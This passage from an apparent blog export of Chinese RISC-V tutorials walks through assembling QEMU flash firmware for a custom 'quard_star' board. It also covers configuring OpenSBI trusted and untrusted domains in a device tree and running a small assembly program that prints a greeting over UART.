0</span></span></span><br><span class="line">dd of=fw.bin bs=1k conv=notrunc seek=0 if=$SHELL_FOLDER/output/lowlevelboot/lowlevel_fw.bin</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">写入 quard_star_sbi.dtb 地址偏移量为 512K，因此 fdt的地址偏移量为 0x80000</span></span><br><span class="line">dd of=fw.bin bs=1k conv=notrunc seek=512 if=$SHELL_FOLDER/output/opensbi/quard_star_sbi.dtb</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">写入 fw_jump.bin 地址偏移量为 2K*1K= 0x2000000，因此 fw_jump.bin的地址偏移量为  0x2000000</span></span><br><span class="line">dd of=fw.bin bs=1k conv=notrunc seek=2k if=$SHELL_FOLDER/output/opensbi/fw_jump.bin</span><br></pre></td></tr></table></figure>

<p><strong>操作：</strong></p>
<ol>
<li>首先编译了opensbi，并且指定了板</li>
<li>编译生成设备树dtb</li>
<li>合成固件</li>
</ol>
<ul>
<li>根据dd命令的使用可以看见将<code>quard_star_sbi.dtb</code>写入到了偏移地址为<code>0x80000</code>的地方，用于这个固件会被加载到<code>flash</code>处，所以设备树的地址为：<code>0x20080000 </code> —- <strong>对应了<code>start.s</code>文件加载设备树的地址</strong></li>
<li><code>fw_jump.bin</code> 地址偏移量为 <code>2K*1K= 0x2000000</code>，因此 <code>fw_jump.bin</code>的地址偏移量为 <code>0x2000000</code>，同理 这个固件会被加载到<code>flash</code>，所以<code>opensbi</code>固件的地址为：<code>0x20200000</code>   <strong>—对应<code>start.s</code> 加载 <code>opensbi</code>的位置</strong></li>
<li><code>lowlevel_fw.bin</code> 偏移量地址为 0，因此<code>lowlevel_fw.bin</code> 的地址为：<code>0x20000000</code></li>
<li><code>dd of=fw.bin bs=1k count=32k if=/dev/zero </code>来填充填充 32K的0，这是<code>qemu</code>使用<code>-drive</code>加载的固件的大小要大于等于定义的<code>flash</code>的大小，不然会报错。</li>
</ul>
<p><strong>注意</strong></p>
<p>现在固件包含三个内容：</p>
<ol>
<li>首先是起始<code>0x20000000</code>的<code>lowlevel_fw.bin</code><ol>
<li>lowlevel的作用是将opensbi 以及设备树文件从flash中 加载到 DRAM（0x80000000），然后跳转到DRAM执行</li>
</ol>
</li>
<li>然后是<code>0x20080000</code>地址处的<code>dtb</code>文件</li>
<li>接下来是<code>0x20200000</code>处的<code>opensbi</code>程序</li>
</ol>
<blockquote>
<p>run.sh</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SHELL_FOLDER=$(cd &quot;$(dirname &quot;$0&quot;)&quot;;pwd)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">SHELL_FOLDER/output/qemu/bin/qemu-system-riscv64 \</span></span><br><span class="line"><span class="language-bash">-M quard-star \</span></span><br><span class="line"><span class="language-bash">-m 1G \</span></span><br><span class="line"><span class="language-bash">-smp 8 \</span></span><br><span class="line"><span class="language-bash">-bios none \</span></span><br><span class="line"><span class="language-bash">-drive <span class="keyword">if</span>=pflash,bus=0,unit=0,format=raw,file=<span class="variable">$SHELL_FOLDER</span>/output/fw/fw.bin \</span></span><br><span class="line"><span class="language-bash">-d in_asm -D qemu.log \</span></span><br><span class="line"><span class="language-bash">-nographic --parallel none \</span></span><br></pre></td></tr></table></figure>

<p>这里添加了一个<code>qemu.log</code>会生成汇编代码，可以根据这个log来查看固件是否有正确的加载、跳转。</p>
<p>执行<code>build.sh run.sh</code></p>
<p>报错<code>./build.sh: 45: dtc: not found</code></p>
<p>执行：<code>sudo apt-get install device-tree-complier</code></p>
<blockquote>
<p>还需要修改</p>
<p>quard_star.c   把DRAM内存扩大</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[QUARD_STAR_DRAM]  = &#123; <span class="number">0x80000000</span>,    <span class="number">0x40000000</span> &#125;,</span><br></pre></td></tr></table></figure>



<p><strong>显示结果</strong></p>
<p><img src="/2024/06/08/riscv-5-%E8%AE%BE%E5%A4%87%E6%A0%91/image-20240609181609447.png" alt="image-20240609181609447"></p>
<h1 id="5-内存布局"><a href="#5-内存布局" class="headerlink" title="5.内存布局"></a>5.内存布局</h1><ol>
<li><code>rom</code>中先从（<code>fw_dynamic_info</code>这个结构体指示了<code>flash</code>的起始地址 在哪找到它）<code>flash</code>记载<code>lowlevel</code>，然后跳转执行<code>flash</code>   (<code>flash</code>中的固件是直接 <code>drive</code>注入的)</li>
<li><code>flash</code>中存放l<code>owerlevel.bin</code>，<code>opensbi</code>固件，设备树固件</li>
<li>将<code>opensbi</code>，设备树固件加载到<code>DRAM</code> 并跳转执行</li>
</ol>
<p><img src="/2024/06/08/riscv-5-%E8%AE%BE%E5%A4%87%E6%A0%91/image-20240609182439432.png" alt="image-20240609182439432"></p>
]]></content>
      <categories>
        <category>riscv</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>riscv，qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>riscv-6-domain</title>
    <url>/2024/06/09/riscv-6-domain%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h1 id="1-domain机制介绍"><a href="#1-domain机制介绍" class="headerlink" title="1.domain机制介绍"></a>1.domain机制介绍</h1><p><strong>domain机制：</strong>人为的将SOC内部硬件划分为<strong>不同的权限区域</strong>，然后分别独立运行，其使用了riscv的权限管理的硬件保护单元。它提供了一种在系统中划分资源和权限的方法，以确保软件实体之间的相互隔离和安全性。</p>
<p>OpenSBI运行在系统的M模式，而<strong>不同Domain的上层程序只能工作在S模式或者U模式</strong>，即便是Linux Kernel也必须接收OpenSBI的Domain权限限制，domain划分带来一个好处，比如你希望SOC中的一部分core在smp模式下运行linux内核，而另一部分core工作在amp模式下，<strong>单独运行裸机程序或者RTOS会非常容易操作，将其划分到不同Domian即可</strong>，除此之外，Domian还可以划分内存地址，mmio地址，可以进行较为细致的权限划分。</p>
<p>Opensbi的domain机制通过以下的方式实现：</p>
<ol>
<li>Domain ID：每个 domain 都有一个唯一的标识符，称为 Domain ID。它用于区分不同的 domain。</li>
<li>Hart Mask：OpenSBI 使用 Hart Mask 来表示哪些处理器属于特定的 domain。<strong>Hart Mask 是一个位图，每个位代表一个处理器，可以将相应的位设置为 1 表示该处理器属于某个 domain。</strong></li>
<li>SBI 接口：OpenSBI 提供了一组 SBI（Supervisor Binary Interface）接口，用于 domain 之间的通信和资源管理。<strong>这些接口包括中断处理、内存管理、设备访问等，可以由 domain 使用来请求和管理资源。</strong></li>
</ol>
<p>在目录<code>opensbi/doc</code>下<code>domian_support.md</code>文档介绍了如何使用设备树来基于opensbi来划分domain。</p>
<p>具体解释见：<a href="https://yanglianoo.github.io/2023/06/24/%E5%9F%BA%E4%BA%8Eopensbi%E4%B8%BAquard-star%E5%88%9B%E5%BB%BAdomain/">基于opensbi为quard_star创建domain | TimerのBlog (yanglianoo.github.io)</a></p>
<h1 id="2-quard-star的domain实现"><a href="#2-quard-star的domain实现" class="headerlink" title="2.quard_star的domain实现"></a>2.quard_star的domain实现</h1><blockquote>
<p>dts&#x2F;quard_star_sbi.dts 添加</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">opensbi-domains &#123;  /* 定义opensbi-domains描述节点 */</span><br><span class="line">    compatible = &quot;opensbi,domain,config&quot;; /* 节点名称 */</span><br><span class="line"></span><br><span class="line">          tmem: tmem &#123;   /* 定义内存节点 */</span><br><span class="line">              compatible = &quot;opensbi,domain,memregion&quot;;  /* 节点名称 */</span><br><span class="line">              base = &lt;0x0 0xb0000000&gt;; /* 起始地址注意64位地址哦 */</span><br><span class="line">              order = &lt;28&gt;; /* 内存大小即size=2^28 */</span><br><span class="line">          &#125;;</span><br><span class="line"></span><br><span class="line">          tuart: tuart &#123;  /* 定义mmio节点 */</span><br><span class="line">              compatible = &quot;opensbi,domain,memregion&quot;;  /* 节点名称 */</span><br><span class="line">              base = &lt;0x0 0x10002000&gt;; /* 起始地址 */</span><br><span class="line">              order = &lt;8&gt;; /* size=2^8 */</span><br><span class="line">              mmio;  /* mmio属性 */</span><br><span class="line">              devices = &lt;&amp;uart2&gt;; /* 关联到设备节点上 */</span><br><span class="line">          &#125;;</span><br><span class="line"></span><br><span class="line">    allmem: allmem &#123; /* 定义内存节点，这个节点保护所有地址 */</span><br><span class="line">        compatible = &quot;opensbi,domain,memregion&quot;;</span><br><span class="line">        base = &lt;0x0 0x0&gt;;</span><br><span class="line">        order = &lt;64&gt;;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">          tdomain: trusted-domain &#123; /* 定义domian节点 */</span><br><span class="line">              compatible = &quot;opensbi,domain,instance&quot;;  /* 节点名称 */</span><br><span class="line">              possible-harts = &lt;&amp;cpu7&gt;; /* domian中允许使用的cpu core */</span><br><span class="line">              regions = &lt;&amp;tmem 0x7&gt;, &lt;&amp;tuart 0x7&gt;, &lt;&amp;allmem 0x7&gt;;/* 各个内存/mmio区域的权限，3bit读写运行权限 0x7拥有全部权限 */</span><br><span class="line">              boot-hart = &lt;&amp;cpu7&gt;; /* domian中用于boot的core */</span><br><span class="line">              next-arg1 = &lt;0x0 0x00000000&gt;; /* 下级程序的参数 */</span><br><span class="line">        next-addr = &lt;0x0 0xb0000000&gt;; /* 下级程序的起始地址 */</span><br><span class="line">        next-mode = &lt;0x0&gt;; /* 下级程序的允许模式 0为U模式，1为S模式 */</span><br><span class="line">              system-reset-allowed; /* 允许复位 */</span><br><span class="line">          &#125;;</span><br><span class="line"></span><br><span class="line">    udomain: untrusted-domain &#123;</span><br><span class="line">        compatible = &quot;opensbi,domain,instance&quot;;</span><br><span class="line">        possible-harts = &lt;&amp;cpu0 &amp;cpu1 &amp;cpu2 &amp;cpu3 &amp;cpu4 &amp;cpu5 &amp;cpu6&gt;;</span><br><span class="line">        regions = &lt;&amp;tmem 0x0&gt;, &lt;&amp;tuart 0x0&gt;, &lt;&amp;allmem 0x7&gt;;</span><br><span class="line">		boot-hart = &lt;&amp;cpu0&gt;;</span><br><span class="line">        next-arg1 = &lt;0x0 0x82200000&gt;;</span><br><span class="line">        next-addr = &lt;0x0 0x82000000&gt;;</span><br><span class="line">        next-mode = &lt;0x1&gt;;</span><br><span class="line">        system-reset-allowed;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p><strong>分开来解释：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tdomain: trusted-domain &#123; 								/* 定义domian节点 */</span><br><span class="line">             compatible = &quot;opensbi,domain,instance&quot;;  			/* 节点名称 */</span><br><span class="line">             possible-harts = &lt;&amp;cpu7&gt;; 							/* domian中允许使用的cpu core */</span><br><span class="line">             regions = &lt;&amp;tmem 0x7&gt;, &lt;&amp;tuart 0x7&gt;, &lt;&amp;allmem 0x7&gt;;	/* 各个内存/mmio区域的权限，3bit读写运行权限 0x7拥有全部权限 */</span><br><span class="line">             boot-hart = &lt;&amp;cpu7&gt;; 								/* domian中用于boot的core */</span><br><span class="line">             next-arg1 = &lt;0x0 0x00000000&gt;; 						/* 下级程序的参数 */</span><br><span class="line">       next-addr = &lt;0x0 0xb0000000&gt;;				 		/* 下级程序的起始地址 */</span><br><span class="line">       next-mode = &lt;0x0&gt;; 									/* 下级程序的允许模式 0为U模式，1为S模式 */</span><br><span class="line">             system-reset-allowed; 								/* 允许复位 */</span><br><span class="line">         &#125;;</span><br></pre></td></tr></table></figure>

<p>定义<code>tdomian</code> — <code>trust domain</code> 这个使用了cpu7，下级程序的起始地址<code>0xb0000000</code>，模式为U模式，可以运行<code>freertos</code>的实时操作系统等</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">udomain: untrusted-domain &#123;</span><br><span class="line">       compatible = &quot;opensbi,domain,instance&quot;;</span><br><span class="line">       possible-harts = &lt;&amp;cpu0 &amp;cpu1 &amp;cpu2 &amp;cpu3 &amp;cpu4 &amp;cpu5 &amp;cpu6&gt;;</span><br><span class="line">       regions = &lt;&amp;tmem 0x0&gt;, &lt;&amp;tuart 0x0&gt;, &lt;&amp;allmem 0x7&gt;;   	# 0x0 表示无权限</span><br><span class="line">	boot-hart = &lt;&amp;cpu0&gt;;</span><br><span class="line">       next-arg1 = &lt;0x0 0x82200000&gt;;</span><br><span class="line">       next-addr = &lt;0x0 0x82000000&gt;;</span><br><span class="line">       next-mode = &lt;0x1&gt;;										/* 下级程序的允许模式 0为U模式，1为S模式 */</span><br><span class="line">       system-reset-allowed;</span><br><span class="line">   &#125;;</span><br></pre></td></tr></table></figure>

<p>定义<code>udomain</code>，不受信任的域，用于运行Linux系统等</p>
<p>这种模式的划分：</p>
<ul>
<li><code>openSBI</code>运行在系统的<code>M</code>模式，而不同<code>Domain</code>的上层程序只能工作在<code>S</code>模式或者<code>U</code>模式，即便是<code>Linux Kernel</code>也必须接收<code>OpenSBI</code>的<code>Domain</code>权限限制，<code>domain</code>划分带来一个好处，比如你希望<code>SOC</code>中的一部分<code>core</code>在<code>smp</code>模式下运行<code>linux</code>内核，而另一部分<code>core</code>工作在<code>amp</code>模式下，单独运行裸机程序或者<code>RTOS</code>会非常容易操作，将其划分到不同<code>Domian</code>即可。</li>
<li><img src="/2024/06/09/riscv-6-domain%E6%9C%BA%E5%88%B6/image-20240610153823283.png" alt="image-20240610153823283"></li>
</ul>
<h1 id="3-domain测试代码"><a href="#3-domain测试代码" class="headerlink" title="3.domain测试代码"></a>3.domain测试代码</h1><p>新建<code>trust_domain</code>文件夹，以及在文件夹内新建两个文件<code>link.lds</code> 和 <code>startup.s</code></p>
<blockquote>
<p>trust_domain&#x2F;link.lds</p>
<p>注意这起始的地址是0xb0000000，与上面 tdomian保持一直，因为信任域设置就从这个地址开始了</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OUTPUT_ARCH( &quot;riscv&quot; )</span><br><span class="line"></span><br><span class="line">ENTRY( _start )</span><br><span class="line"></span><br><span class="line">MEMORY</span><br><span class="line">&#123; </span><br><span class="line">	ddr (rxai!w) : ORIGIN = 0xb0000000, LENGTH = 256M</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SECTIONS</span><br><span class="line">&#123;</span><br><span class="line">  .text :</span><br><span class="line">  &#123;</span><br><span class="line">    KEEP(*(.text))</span><br><span class="line">  &#125; &gt;ddr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>trust_domain&#x2F;startup.s</p>
<p>这里串口输出的是<code>uart2</code>，也就是上面定义的<code>tuart</code>，输出地址为<code>0x10002000</code> </p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	.section .text</span><br><span class="line">	.globl _start</span><br><span class="line">	.type _start,@function</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">	li		t0,	0x100</span><br><span class="line">	slli	t0,	t0, 20   # 左移20位</span><br><span class="line">	li		t1,	0x200</span><br><span class="line">	slli	t1,	t1, 4    # 左移 4位</span><br><span class="line">	add     t0, t0, t1</span><br><span class="line">	li		t1,	&#x27;H&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;e&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;l&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;l&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;o&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27; &#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;Q&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;u&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;a&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;r&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;d&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27; &#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;S&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;t&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;a&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;r&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27; &#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;b&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;o&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;a&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;r&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;d&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;!&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;\r&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;\n&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">_loop:</span><br><span class="line">	j		_loop</span><br><span class="line"></span><br><span class="line">    .end</span><br></pre></td></tr></table></figure>



<blockquote>
<p>还需要修改 build.sh</p>
<p>将t_fw，写入到了fw.bin的0x400000偏移的地方. — flash</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译 tdomain</span></span><br><span class="line">if [ ! -d &quot;$SHELL_FOLDER/output/trusted_domain&quot; ]; then  </span><br><span class="line">mkdir $SHELL_FOLDER/output/trusted_domain</span><br><span class="line">fi  </span><br><span class="line">cd $SHELL_FOLDER/trust_domain</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CROSS_PREFIX-gcc -L/opt/riscv/riscv64-unknown-elf/lib -L/opt/riscv/lib -x assembler-with-cpp -c startup.s -o <span class="variable">$SHELL_FOLDER</span>/output/trusted_domain/startup.o</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CROSS_PREFIX-gcc -L/opt/riscv/riscv64-unknown-elf/lib -L/opt/riscv/lib -nostartfiles -T./link.lds -Wl,-Map=<span class="variable">$SHELL_FOLDER</span>/output/trusted_domain/trusted_fw.map -Wl,--gc-sections <span class="variable">$SHELL_FOLDER</span>/output/trusted_domain/startup.o -o <span class="variable">$SHELL_FOLDER</span>/output/trusted_domain/trusted_fw.elf</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CROSS_PREFIX-objcopy -O binary -S <span class="variable">$SHELL_FOLDER</span>/output/trusted_domain/trusted_fw.elf <span class="variable">$SHELL_FOLDER</span>/output/trusted_domain/trusted_fw.bin</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CROSS_PREFIX-objdump --<span class="built_in">source</span> --demangle --disassemble --reloc --wide <span class="variable">$SHELL_FOLDER</span>/output/trusted_domain/trusted_fw.elf &gt; <span class="variable">$SHELL_FOLDER</span>/output/trusted_domain/trusted_fw.lst</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">写入 tdomain，地址偏移 4k * 1k = 0x400000, 因此 t_fw的地址偏移 0x400000</span></span><br><span class="line">dd of=fw.bin bs=1k conv=notrunc seek=4k if=$SHELL_FOLDER/output/trusted_domain/trusted_fw.bin</span><br></pre></td></tr></table></figure>



<blockquote>
<p>boot&#x2F;start.s</p>
<p>这里还要将位与flash中0x400000中的 trust_fw.bin加载到DRAM中。 还是采用了 load_data函数</p>
<p>从<code>[0x20400000:0x20800000]</code> –&gt; 加载到<code>[0x80200000:0x80600000]</code></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//load trusted_fw.bin</span><br><span class="line">//[0x20400000:0x20800000] --&gt; [0x80200000:0x80600000]</span><br><span class="line">   li		a0,	0x204</span><br><span class="line">slli	a0,	a0, 20      //a0 = 0x20400000</span><br><span class="line">   li		a1,	0xb00</span><br><span class="line">slli	a1,	a1, 20      //a1 = 0xb0000000</span><br><span class="line">   li		a2,	0xb04</span><br><span class="line">slli	a2,	a2, 20      //a2 = 0xb0400000</span><br><span class="line">load_data a0,a1,a2</span><br></pre></td></tr></table></figure>



<blockquote>
<p>run.sh</p>
<p><code>DEFAULT_VC</code>来指定了qemu显示的分辨率，还需要新增三个<code>-serial</code>选项让qemu输出三个串口终端</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SHELL_FOLDER=$(cd &quot;$(dirname &quot;$0&quot;)&quot;;pwd)</span><br><span class="line">DEFAULT_VC=&quot;1080x1920&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">SHELL_FOLDER/output/qemu/bin/qemu-system-riscv64 \</span></span><br><span class="line"><span class="language-bash">-M quard-star \</span></span><br><span class="line"><span class="language-bash">-m 1G \</span></span><br><span class="line"><span class="language-bash">-smp 8 \</span></span><br><span class="line"><span class="language-bash">-bios none \</span></span><br><span class="line"><span class="language-bash">-drive <span class="keyword">if</span>=pflash,bus=0,unit=0,format=raw,file=<span class="variable">$SHELL_FOLDER</span>/output/fw/fw.bin \</span></span><br><span class="line"><span class="language-bash">-d in_asm -D qemu.log \</span></span><br><span class="line"><span class="language-bash">--serial vc:<span class="variable">$DEFAULT_VC</span> --serial vc:<span class="variable">$DEFAULT_VC</span> --serial vc:<span class="variable">$DEFAULT_VC</span> --monitor vc:<span class="variable">$DEFAULT_VC</span> --parallel none \</span></span><br><span class="line"><span class="language-bash"><span class="comment">#-nographic --parallel none \</span></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>串口1 输出opensbi</p>
</blockquote>
<img src="/2024/06/09/riscv-6-domain%E6%9C%BA%E5%88%B6/image-20240610160946767.png" alt="image-20240610160946767" style="zoom:50%;">

<blockquote>
<p>串口2 输出：</p>
</blockquote>
<p><img src="/2024/06/09/riscv-6-domain%E6%9C%BA%E5%88%B6/image-20240610161015912.png" alt="image-20240610161015912"></p>
<h1 id="4-内存布局"><a href="#4-内存布局" class="headerlink" title="4.内存布局"></a>4.内存布局</h1><p>加入了<code>trust_domain.bin</code>后，内存布局如下，首先是<code>flash</code>的<code>0x400000</code>上增加了<code>t_domain</code>，然后需要加载到 <code>DRAM</code>的<code>0xb0000000</code></p>
<p><img src="/2024/06/09/riscv-6-domain%E6%9C%BA%E5%88%B6/image-20240610161319772.png" alt="image-20240610161319772"></p>
]]></content>
      <categories>
        <category>riscv</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>riscv，qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>riscv-7-opensbi控制台输出以及手写操作系统</title>
    <url>/2024/06/10/riscv-7-opensbi%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BE%93%E5%87%BA%E4%BB%A5%E5%8F%8A%E6%89%8B%E5%86%99%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[]]></content>
  </entry>
</search>
